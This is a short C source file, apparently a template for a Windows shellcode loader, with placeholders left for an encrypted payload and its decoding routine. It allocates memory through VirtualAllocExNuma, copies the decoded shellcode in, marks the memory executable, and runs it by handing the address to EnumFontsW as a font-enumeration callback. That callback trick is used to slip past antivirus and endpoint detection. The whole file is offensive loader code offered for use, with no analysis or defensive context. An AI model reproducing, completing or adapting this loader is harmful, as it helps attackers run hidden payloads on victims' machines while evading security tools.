#include <windows.h>
#include "base64.h"
#include "syscall.h"

#pragma comment(lib, "Gdi32.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	HDC dc = GetDC(NULL);
	EnumFontsW(dc, NULL, (FONTENUMPROCW)addr, NULL);

	return 0;

}